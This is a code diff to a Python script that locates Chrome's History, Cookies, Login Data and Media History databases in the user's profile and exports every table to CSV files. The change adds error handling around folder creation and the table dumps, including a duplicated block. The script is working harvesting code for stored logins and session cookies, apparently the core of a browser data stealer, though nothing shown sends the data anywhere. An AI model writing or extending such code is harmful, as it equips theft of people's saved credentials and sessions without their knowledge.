@@ -13,11 +13,30 @@ login_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Login
 media_history_url= getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Media History"
 
 def create_dirs():
-    os.mkdir("Files")
-    os.mkdir("Files/History")
-    os.mkdir("Files/Cookies")
-    os.mkdir("Files/Login_Data")
-    os.mkdir("Files/Media_History")
+    try:
+        os.mkdir("Files")
+    except Exception:
+        print("Files Are Available")
+    try:
+        os.mkdir("Files")
+    except Exception:
+        print("Files Are Available")
+    try:
+        os.mkdir("Files/History")
+    except Exception:
+        print("Files Are Available")
+    try:
+        os.mkdir("Files/Cookies")
+    except Exception:
+        print("Files Are Available")
+    try:
+        os.mkdir("Files/Login_Data")
+    except Exception:
+        print("Files Are Available")
+    try:
+        os.mkdir("Files/Media_History")
+    except Exception:
+        print("Files Are Available")       
 def database():
     global history_url
     global cookies_url
@@ -32,9 +51,12 @@ def database():
         cursor = conn.cursor()
         result = cursor.execute("Select name from sqlite_master where type='table'")
         for data in result.fetchall():
-            csv_file = pd.read_sql_query(f"Select * from {data[0]}",conn)
-            csv_file.to_csv(f"Files\{folder_name[flag]}\{str(data[0]).capitalize()}.csv",index=False)            
-            data = cursor.execute(f"Select * from {data[0]}")
+            try:
+                csv_file = pd.read_sql_query(f"Select * from {data[0]}",conn)
+                csv_file.to_csv(f"Files\{folder_name[flag]}\{str(data[0]).capitalize()}.csv",index=False)            
+                data = cursor.execute(f"Select * from {data[0]}")
+            except Exception:
+                print("Error In Decrypting")
         flag = flag + 1
 if __name__ == "__main__":
     database()
